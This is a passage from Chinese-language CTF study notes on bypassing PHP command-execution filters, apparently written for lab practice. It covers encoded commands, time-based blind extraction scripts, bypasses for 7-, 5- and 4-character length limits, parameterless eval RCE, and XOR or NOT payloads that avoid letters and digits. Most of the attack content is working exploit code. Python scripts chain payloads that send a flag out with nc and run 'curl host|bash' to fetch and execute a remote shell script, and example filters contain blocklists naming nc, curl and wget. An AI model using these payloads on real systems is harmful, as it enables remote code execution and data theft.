└─# $(echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d)        
Flag is this
```

### 3. `HEX`编码绕过

```bash
# 使用 Linux 对字符串做 HEX 运算
# -ps 以纯文本16进制的形式输出
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "cat /flag.txt" |xxd -ps                      
636174202f666c61672e7478740a

# 使用 编码转换 的方式执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "636174202f666c61672e7478740a" |xxd -r -p |/bin/bash
Flag is this
```

### 4. `shellcode`编码

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74" |/bin/bash
Flag is this
```

### 5. 编码转换脚本

```python
import binascii

# 要转换的字符串
string = "cat /flag.txt"

hex_string = binascii.hexlify(string.encode()).decode()
print('HEX 编码：', hex_string)

res = ''
for i in range(0, len(hex_string), 2):
    res += '\\x' + hex_string[i] + hex_string[i + 1]

print("shell code编码：", res)
```

## 0x10. 无回显盲注

### 例题代码

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\!|\@|\#|\%|\^|\&|\*|\?|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['cmd'])){
    $cmd=$_GET['cmd'];
    check($cmd);
    exec($cmd);
}
else{
    highlight_file(__FILE__);
}
?>
```

### 前置知识

#### 1. `awk NR==N`：查询指定行

```bash
# awk NR==2：指定查询第二行的内容
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat -n base.txt| awk NR==2 
     2  is
```

#### 2. `cut -c`：查询指定列的字符

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| cut -c 1 
f
i
t
h
h
h
```

#### 3. 组合查询指定行的第N个字符

```bash
# 查询第一行的第一个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==1 |cut -c 1
f

# 查询第二行的第二个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==2 |cut -c 2
s
```

#### 4. `IF`语句

由于在Linux中，`<`，`>`字符被用于重定向，所以需要用其他字符来代替

```
-gt（大于）、-lt（小于）、-ge（大于等于）和 -le（小于等于）
```

```bash
# 格式
if [ 条件表达式 ];then True分支;fi

# 3>2，指定命令
# 注意在 [] 中，所有字符都需要有一个空格隔开
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ 3 -gt 2 ];then echo 'yes';fi
yes
```

#### 5. `sleep`：睡眠

```bash
# 睡眠3秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ sleep 3  
```

#### 6. 组合使用

```bash
# 如果文件中的第一个字符为f就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt| awk NR==1| cut -c 1) == 'f' ];then sleep 2;fi

# 如果文件中的第三行第一个字符是 t 就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt |awk NR==3| cut -c 1) == 't' ];then sleep 2;fi
```

### Python盲注脚本

```py
# 我写的
import requests
import time

base_url = "http://192.168.231.129:18080/class08/1.php?cmd="

# if [ $(cat base.txt| awk NR==2 |cut -c 2) == s ];then echo "yes";fi
res = ''
# 多少行
for row in range(1, 10):
    # 多少字符
    for cut_char in range(1, 50):
        # ASCII 码爆破范围
        for ascii_char in range(32, 128):
            # time.sleep(0.5)
            char = chr(ascii_char)
            # payload = f"if [ `cat /flag |awk NR=={row} | cut -c {cut_char}` == {char} ];then sleep 2;fi"
            payload = f"if [ `cat flag.php | awk NR=={row} | cut -c {cut_char}` == {ascii_char} ];then sleep 2;fi"
            url = base_url + payload
            # print(url)
            try:
                print("发送：", end='')
                req = requests.get(url, timeout=1).text
                print(req)
            except Exception as e:
                print("获得字符：",char)
                res += char
                break
print(res)

# 课程给的
import requests
import time
url = "http://192.168.1.6:19080/class08/1.php"
result = ""
for i in range(1,5):
    for j in range(1,55):
        #ascii鐮佽〃
        for k in range(32,128):
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
```

## 0x11. 长度绕过前置知识

### 1. 命令换行执行

```bash
# \ 可以使命令换行执行
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ca\ 
> t\            
>  flag
ctuctf={awsduhwiquhduiqwbfiu}
```

### 2. `ls -t`：按时间排序显示

将文件名按时间排序来显示，**从最近--->最远**，单位为秒

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t    
 x  'cat \'  'fla\'   g   flag
```

### 3. `>`创建文件

可以使用重定向输出创建文件

```bash
# 一般用法
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# echo "ctuctf={awsduhwiquhduiqwbfiu}" > flag 

# 也可以直接当 touch 使用
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
```

### 4. 执行文件

#### `sh`：执行命令

**sh命令** 是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取

```shell
bash [options] [file]
```

**sh命令** 执行命令**不需要文件有执行权限**，推荐使用这种方法

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

#### `./filename`：执行命令

要求文件有执行权限

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ./x
./x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
./x: 5: flag: not found
```

### 5. 组合使用

#### 思路

1. 利用`>`来创建文件，减少命令长度
2. 利用`\`来切割命令
3. `ls -t`，按时间将文件名来排序，最后使用`>`写入执行文件

#### 实战流程

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >g    
^C
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >cat\ \\
^C                                                                                                                                                                                                                                                
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t > x
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

### `dir`命令

`dir`会在`ls -t`的基础上做不换行输出

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir                                   
cat\ \\  fla\\  flag  g  x
                                                                                                                                                                                   
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir > z
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# cat z
cat\ \\  fla\\  flag  g  x  z
```

**`$(dir*)`**会将两个文件名拼接成一条命令，其中第一个文件名为命令，第二个文件名为参数

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir    
cat  flag

┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# $(dir *)                                   
ctuctf={awsduhwiquhduiqwbfiu}
```

### `rev`反向输出文件内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# rev flag                               
}uifbwqiudhuqiwhudswa{=ftcutc
```

## 0x12. 长度为7限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    $a = str_replace("/\*|\?|/","=====",$argv);
    return $a;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 7) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!!";
}
```



利用前置知识，将命做为文件名分为多断写入，最后使用命令`ls -t>y`，写入文件，使用`sh y`执行命令

注意：由于`ls -t`会以时间由近及远的方式写入，所以需要将命令倒着写入

### POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/class09/2/index.php?cmd='

if __name__ == '__main__':
    # 要执行命令：
    # cat flag|nc 192.168.231.129 7777
    # ls -t>a
    # sh a
    payload_list = ['>7777', '>29\ \\\\', '>1.1\\\\', '>23\\\\', '>68.\\\\', '>2.1\\\\', '>19\\\\',
                    '>nc\ \\\\', '>g\|\\\\', '>fla\\\\', '>t\ \\\\', '>ca\\\\', 'ls -t>a', 'sh a']
    rst = ''
    for i in payload_list:
        rst += ' ' + i
        print("发送：", rst)
        res = requests.get(base_url + i).text
        # print(res)
```

## 0x13. 长度为5限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    $a = str_replace("/\*|\?|/","=====",$argv);
    return $a;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!";
}
```



在`0x12`的基础上改进：

1. `ls -t>y`超过了5个字符，所以这种方法不可取；延申长度为7的绕过思路，使用`ls>y`命令，将`ls -t>y`的命令截断写入文件，最后执行

   1. 这里有一个窍门，因为`ls`排序的问题，所以我们需要先将`ls\\`写入文件中

   2. 写入顺序如下：

   3. ```bash
      # 先将 ls\ 创建出来并写入，后续追加就能得到想要的效果
      z`
      ls>_
      >\ \\
      >-t\\
      >\>y
      ls>>_
      
      root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/3# cat _
      _
      backup
      flag
      index.php
      # 这里组成了一段完整的命令
      # ---------------
      ls\
       \
      -t\
      >y
      _
      # ---------------
      backup
      flag
      index.php
      ls
      ```

### POC代码

由于需要通过`curl`的方式来执行`nc`以获取`webshell`，所以这里需要先开启Web服务

```bash
import requests
import time

base_url = 'http://192.168.231.129:18080/class09/3/index.php?cmd='

if __name__ == '__main__':
    # 写入命令1：ls -t>x
    payload_list1 = ['>ls\\\\', 'ls>_', '>\\ \\\\', '>-t\\\\', '>\\>y', 'ls>>_']
    # 写入命令2：curl 192.168.231.129|bash
    payload_list2 = [">bash", ">\\|\\\\", ">29\\\\", ">1\\\\", ">1.\\\\", ">23\\\\", ">8.\\", ">16\\", ">2.\\", ">19\\", ">\ \\",">rl\\", ">cu\\"]

    rst = ''
    for i in payload_list1:
        rst += ' ' + i
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + i).text

    rst = ''
    for j in payload_list2:
        rst += ' ' + j
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + j).text

    requests.get(base_url + "sh _")
    requests.get(base_url + "sh y")
```

## 0x14. 长度为4限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    str_replace("/\?|/","=====",$argv);
    return $argv;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!";
}
```

### 思路分析

由于长度的限制为4，所以`ls>>a`超过了规定长度，无法构造出所需命令`ls -t`

可以使用**`*`**进行绕过，作用相等于`$(dir)`，将第一个文件名当作命令，后续的文件名当作参数

```bash
┌──(pinginglab㉿pinginglab)-[~/php-exec/xyz]
└─$ ls             
cat  flag
       
# 执行了命令：cat flag
┌──(pinginglab㉿pinginglab)-[~/php-exec/xyz]
└─$ *
hahaha
```

### payload 构造分析

**构造思路：**利用`* = $(dir)`的特点，执行`dir`命令，为了保证字符的顺序，这里使用倒序，最后使用命令`rev`进行排序

```bash
# 先构造一个 ; 来截断命令，防止后面有其他字符干扰命令执行
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >g\;
# 倒序构造命令
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >g\>
# 由于 t 的排序靠后，无法组成完整顺序，所以这里使用 h 把排序往前拉
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >ht-
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >sl
# 创建文件 dir，以便使用 * 执行
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >dir
# 这里等于 dir>v
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# *>v
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# cat v
ffff.php  flag  g;  g>  ht-  sl

zackup:
ffff.php  flag

# 创建文件 rev
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >rev
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# ls
 dir   ffff.php   flag  'g;'  'g>'   ht-   rev   sl   v   zackup
# 这里等于 rev v>x
# 这里之所以能匹配到 rev 而不是 div，可能是因为命令是：*v>x，而不是：*>x，因为 div 不需要参数
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# *v>x
# 成功构造出 ls -th g
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# cat x
ls  -th >g  ;g  galf  php.ffff

:pukcaz
galf  php.ffff

# 最后使用同样的方法构造出命令：curl 0xC0A8E781|bash
```

### POC代码

```py
import requests
import time

base_url = 'http://192.168.231.129:18080/class09/4/ffff.php?cmd='

if __name__ == '__main__':
    # 文件 v 用于存储 dir 输出的内容
    # 文件 x 用于将文件 v 的内容进行倒序
    # 写入命令1：ls -t>x
    payload_list1 = ['>g\;', '>g\>', '>ht-', '>sl', '>dir', '*>v', '>rev', '*v>x']
    # 写入命令2：curl 192.168.231.129|bash
    payload_list2 = [">ash", ">b\\", '>\|\\', '>81\\', '>E7\\', '>A8\\', '>C0\\', '>0x\\', '>\ \\', '>rl\\', '>cu\\']

    rst = ''
    for i in payload_list1:
        rst += ' ' + i
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + i).text

    rst = ''
    for j in payload_list2:
        rst += ' ' + j
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + j).text

    requests.get(base_url + "sh x")
    requests.get(base_url + "sh g")
```

## 0x15. 无参数命令执行请求头绕过（PHP 7.0）

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

正则表达式解析

```php
/[^\W]+\((?R)?\)/
    
[^\W]+：等于 [\w]+，表示匹配 字母、数字_下划线
\(：匹配 (
\)：匹配 )
?R：递归匹配。能匹配 a(b(c()))
总结：能匹配所有不带参数的函数
```

### 前置知识

#### `getallheaders` 函数

`getallheaders` — 获取全部 HTTP 请求头信息

```
getallheaders ( void ) : array
```

##### 返回值

包含当前请求所有头信息的数组，失败返回 **`FALSE`** 。

#### `end()`函数

`end` — 将数组的内部指针指向最后一个单元；返回数组中的最后一个元素

end ( array `&$array` ) : [mixed](language.pseudo-types.html#language.types.mixed)

**end()** 将 `array` 的内部指针移动到最后一个单元并返回其值。

##### 参数



- `array`

  这个数组。 该数组是通过引用传递的，因为它会被这个函数修改。 这意味着你必须传入一个真正的变量，而不是函数返回的数组，因为只有真正的变量才能以引用传递。

##### 返回值

返回最后一个元素的值，或者如果是空数组则返回 **`FALSE`**。

#### `pos()` 函数

**是函数`current()`的别名**

##### 说明

```
current ( array `&$array` ) : [mixed](language.pseudo-types.html#language.types.mixed)
```

每个数组中都有一个内部的指针指向它“当前的”单元，初始指向插入到数组中的第一个单元。

##### 参数

- `array`

  这个数组。

##### 返回值

**current()** 函数返回当前被内部指针指向的数组单元的值，并不移动指针。如果内部指针指向超出了单元列表的末端，**current()** 返回 **`FALSE`**。

### 思路

1. 利用`eval()`函数执行函数

2. 通过修改请求头的方式执行想要执行的命令

3. 通过函数`getallheaders()`获取请求头；如果不行，可以尝试使用`apache_request_headers()`

4. 通过`pos()`、`end()`、`current()`函数获取命令

5. 最后包裹`system()`执行命令

   ```bash
   payload：?code=system(pos(getallheaders()));
   ```

### 解题流程

#### 1. 获取请求头

注意：这里的输出是将请求头的内容倒序输出

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173806266.png" alt="image-20230816173806266" style="zoom:80%;" />

#### 2. 获取指定内容

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173906487.png" alt="image-20230816173906487" style="zoom:80%;" />

#### 3. 修改请求头

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816173940951.png" alt="image-20230816173940951" style="zoom:80%;" />

#### 4. 执行命令

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816174015690.png" alt="image-20230816174015690" style="zoom:80%;" />

## 0x16. 无参数全局变量RCE（PHP 5/7）

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

### 前置知识

#### get_defined_vars

(PHP 4 >= 4.0.4, PHP 5, PHP 7)

get_defined_vars — ==返回由所有已定义变量所组成的数组==

##### 描述

```
get_defined_vars ( void ) : array
```

此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

### 解题流程

大致手法和思路跟上一题一样，不过这种方法更加灵活适用

```
payload：system(end(pos(get_defined_vars())));&cmd=cat+flag;
```

#### 1. 查看当前所有变量

```
?code=var_dump(get_defined_vars());
```

![image-20230816215701700](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215701700.png)

#### 2. 增加变量-->命令

```
?code=var_dump(get_defined_vars());&cmd=ls;
```

![image-20230816215830837](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215830837.png)

#### 3. 抓取变量

先用`pos()`方法将全局数组`$_GET`，再使用`end()`方法抓`ls`

```
?code=var_dump(pos(get_defined_vars()));&cmd=ls;
?code=var_dump(end(pos(get_defined_vars())));&cmd=ls;
```

![image-20230816215924585](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816215924585.png)

![image-20230816220039674](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816220039674.png)

#### 4. 执行命令

由于例题中，有一个`eval()`函数包裹，所以这里直接执行`system()`就行

```
?code=system(end(pos(get_defined_vars())));&cmd=ls;
```

![image-20230816220129093](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816220129093.png)

## 0x17. 无参数session RCE

### 例题代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
?>
```

### 思路

1. 首先查看请求头是否携带了`cookie`，没有就使用函数`session_start()`开启

2. 使用`session_id()`获取`cookie`值

3. 使用`system()`执行命令

   注意：由于请求头中的`Cookie`只接受 数字和字符，所以如果想往里面输入空格或者括号的话，就需要使用`HEX`编码，然后在payload中使用函数`hex2bin()`来解码

### 解题流程

#### 1. 开启Session

这一步需要先在浏览器执行，不要直接在Burp Suite上做，否则会抓不到Cookie

```
?code=var_dump(session_start());
```

![image-20230816222201773](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222201773.png)

#### 2. 获取Session值

```
?code=var_dump(session_id(session_start()));
```

![image-20230816222323558](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222323558.png)

#### 3. 修改Cookie值

![image-20230816222521768](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222521768.png)

#### 4. 执行命令

```
system(session_id(session_start()));
```

![image-20230816222546769](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222546769.png)

#### 5. 编码绕过

由于如果先执行`cat flag`命令，其中带有空格，所以Cookie会事变不了，这里使用`HEX`编码，注意使用函数`hex2bin()`解码

```
?code=system(hex2bin(session_id(session_start())));
```

![image-20230816222810927](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230816222810927.png)

## 0x18. 无参数`scandir`读取（上）

### 可利用函数

```
scandir() -- 列出指定路径终端文件和目录（PHP 5、PHP 7、PHP 8）
getcwd() -- 获取当前工作路径（PHP 4、PHP 7、PHP 8）
current() -- 返回数组中的当前值（PHP 4、PHP 5、PHP 7、PHP 8）
array_reverse() -- 将指定数组倒序返回（PHP 4、PHP 5、PHP 7、PHP 8）
array_flip() -- 交换数组中的键和值（PHP 4、PHP 5、PHP 7、PHP 8）
next() -- 将数组中的内部指针向前移动并返回值（PHP 4、PHP 5、PHP 7、PHP 8）
array_rand() -- 从数组中随机取出一个或多个随机值，若只取出一个，则返回键名
strrev() -- 将指定字符串反转倒序输出
crypt() -- 用来加密
hebrev() -- 把希伯来文从右至左的流转换为左至右的流
```

## 0x19. 无参数`scandir`读取（下）

### 读取上一目录

```
payload：show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));
```

#### 讲解

1. `getcwd()`：函数读取当前工作路径、返回一个路径
2. `dirname()`：读取路径并返回该路径的父路径
3. `chdir()`：相当于`cd`命令，进入指定路径
4. `dirname`：继续返回父路径，此时的路径为`.`
5. `scandir()`：扫描指定路径的文件和文件夹
6. `end()`：使用`end、pos、next`等函数来指定要查看的文件
7. `show_source()`：读取文件，也可以使用`highlight_file()`

### 读取根目录

```
payload：show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));
```

#### 讲解

1. `array()`：打印一个空数组
2. `serialize()`：对这个空数组进行序列化，返回一串字符串
3. `crypt()`：对这串字符串进行加密，返回一串密文，这串密文包含`/`这个字符串
4. `strrev()`：对这个字符串进行倒序输出
5. `chr()、ord()`：如果输入一串字符串只会对第一个字符做运算，使用这一特性，取出字符串`/`
6. `chdir()`：更改工作路径，`cd /`
7. `dirname()`：返回当前路径的父路径并返回路径字符串
8. `scandir()`：扫描该路径的文件和文件夹
9. `array_flip()`：将数组中的键值对对调
10. `array_rand()`：随机获取数组中的某一个键名
11. `show_source`：读取文件，也可以使用`highlight_file()`

总结：要成功得到`/`目录下的`flag`，要两个前提条件：

1. 加密的密文字符串中的最后一位字符必须是`\`
2. `array_rand()`：随机到的条目必须是`flag`文件

#### POC代码

```py
import requests

base_url = 'http://47.120.43.120:18082/class10/1.php?code='
payload = 'show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));'

for i in range(4000):
    res = requests.get(base_url + payload).text
    print(res)
```

## 0x20. 无字母数字异或运算绕过

### 1. 异或运算

将一串二进制字符串进行逐位异或运算，**相同为0，不同为1**

### 2. 异或运算脚本

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
$shell = $_GET["cmd"];
$result1 = "";
$result2 = "";

function judge($c)
{
    if(!preg_match('/[a-z0-9]/is',$c))
    {
        return true;
    }
    return false;
}

for($num=0;$num<=strlen($shell);$num++)
{
    for($x=33;$x<=126;$x++)
    {
        if(judge(chr($x)))
        {
            for($y=33;$y<=126;$y++)
            {
                if(judge(chr($y)))
                {
                    $f = chr($x)^chr($y);
                    if($f == $shell[$num])
                    {
                        $result1 .= chr($x);
                        $result2 .= chr($y);
                        break 2;
                    }
                }
            }
        }
    }
}
echo "异或运算第一部分： ".$result1;
echo "<br>";
echo "异或运算第二部分： ".$result2;
```

```php
<?php
$target = 'get_the_flag';
$result1 = '';
$result2 = '';

for ($j = 0; $j <= strlen($target); $j++) {
    for ($i = 128; $i < 255; $i++) {
        if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i))) {            # 这里的正则可以依据题目的正则更改
            continue;
        }
 
        if ((chr($i) ^ chr(255)) == $target[$j]) {
            $result1 .= urlencode(chr($i));
            $result2 .= urlencode(chr(255));
        }
//        echo sprintf("%s^%s", urlencode(chr($i)), urlencode(chr(255))) . "=>" . (chr($i) ^ chr(255)) . "\n";
    }
}

var_dump($result1, $result2);
echo "result ^ result2 = ", urldecode($result1) ^ urldecode($result2);
```

### 3. PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
```

#### POC 代码

```php
<?php
$_ = '("((%-'^'[[[\@@';		// 异或结果：system
$__ = '!+/(('^'~{`{|';		// 异或结果：_POST
$___ = $$__;				// $___ = $_POST; $$__ = $_POST
$_($___['____']);			// 代码拼接：system($_POST['____'])
```

#### payload

提交之前需先做**URL编码**

```
cmd=$_ = '("((%-'^'[[[\@@';$__ = '!+/(('^'~{`{|';$___ = $$__;$_($___['____']);
```

此时即可使用POST提交要执行的命令

![image-20230821165943022](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821165943022.png)

#### 扩展

如果对方禁止了`system、eval、passthru`等函数的执行，那么可以使用反引号来执行命令；但是由于反引号没有回显，所以此时我们可以直接使用nc回弹`webshell`

## 0x21. 无字母数字取反绕过

### 取反运算

将二进制序列逐位取反计算

例如：现有一串二进制字符串`1001`，取反运算后结果位：`0110`

### PHP 5.0 解题

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### POC代码

```php
$_ = ~('%9e%8c%8c%9a%8d%8b');			// 取反运算结果：assert
$__ =  ~('%a0%af%b0%ac%ab');			// 取反运算结果：_POST
$___ = $$__;							// $__ = _POST; $$__ = $_POST
$_($___['____']);						// 代码组装：assert($_POST['____'])
```

```
payload：
GET传参：
cmd=$_ = ~('%9e%8c%8c%9a%8d%8b');$__ =  ~('%a0%af%b0%ac%ab');$___ = $$__;$_($___['____']);

POST传参：
____=system('cat flag')
```

![image-20230821205218805](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821205218805.png)

#### 取反运算计算脚本

```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
$shell = $_GET['cmd'];
$result = "";
$arr =array();
$word = "一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺
木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引
丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们
仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾
扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传
乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅
字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖
护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我
乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟
没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖
拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚
旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿
胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试
